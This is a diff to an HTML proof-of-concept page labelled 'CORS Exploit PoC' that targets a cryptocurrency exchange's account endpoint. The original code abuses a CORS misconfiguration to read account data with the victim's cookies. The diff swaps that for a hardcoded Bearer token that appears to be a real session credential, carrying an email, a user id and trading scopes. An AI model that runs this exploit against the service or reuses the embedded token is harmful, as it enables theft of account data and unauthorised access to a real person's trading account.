@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>CORS Exploit PoC</h1>
-    <p>Click the button below to fetch sensitive data from the vulnerable API using the victim's session.</p>
+    <p>Click the button below to fetch sensitive data from the vulnerable API.</p>
     <button id="fetchData">Fetch Data</button>
     <h2>Response:</h2>
     <pre id="response"></pre>
@@ -17,7 +17,9 @@
             // Exploit the CORS misconfiguration
             fetch("https://api.woox.io/woo/account", {
                 method: "GET",
-                credentials: "include", // Ensure cookies are included in the request
+                headers: {
+                    "Auth": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzeW1leGFtZUBjeWNsZWxvdmUuY2MiLCJyYW5kb20iOiJreEVHakkiLCJhdXRoX3R5cGUiOiIxIiwidXNlcl9pZCI6MjUyNjQwLCJzY29wZXMiOiJhc3NldCxvcmRlcmJvb2ssb3JkZXI6aW9jLG9yZGVyOmZvayxvcmRlcjpsaW1pdCxvcmRlcjptYXJrZXQsb3JkZXI6cG9zdG9ubHksdHJhZGUsc2VjdXJpdHksb3JkZXI6YXNrLG9yZGVyOmJpZCx0cmFkaW5nIiwiZXhwaXJlX2luIjo2MDQ4MDAsInZlcnNpb24iOjE2LCJjbGllbnRfaWQiOiJiZDkzZDQxMS0yYmFkLTQ1MmUtODlhOS0wMDQ5MzNjOThiYTQiLCJleHAiOjE3MzY4NjU1MTksImlzcyI6IldPT1RSQURFIiwiaWF0IjoxNzM2MjYwNzE5fQ.hWuodLDaArogthX7_5WnM5v3S76L61Vt153JRRK8hsGYmUN3pwyEhX23aP9dD-_ZbM7ljmJ43NxibsBnYL5WGvmea_oXRjxuNNoKkLxCFdG9sbmoYFyWsnO30oegULvSQeujK-4kX_xKCRdweIqjFBKkSBS-hE6XDy8kAIfK3UsF1WWUdb_8ztw3zSPC3dh-vYBv1Fz04LOXLE7EvfGCKksQ_nojnXaaqORC7KHfiXXH_lS6uZ3KV3LSYOYEc_6Vd6BCz-eNeJULtbLoyDECCm8OpatiG_a5a-n4L4gP6CMwTucdRthehDv3qQpgzlUgT5xImvLoBMMYCplrnSlGog"
+                }
             })
             .then(response => {
                 if (!response.ok) {
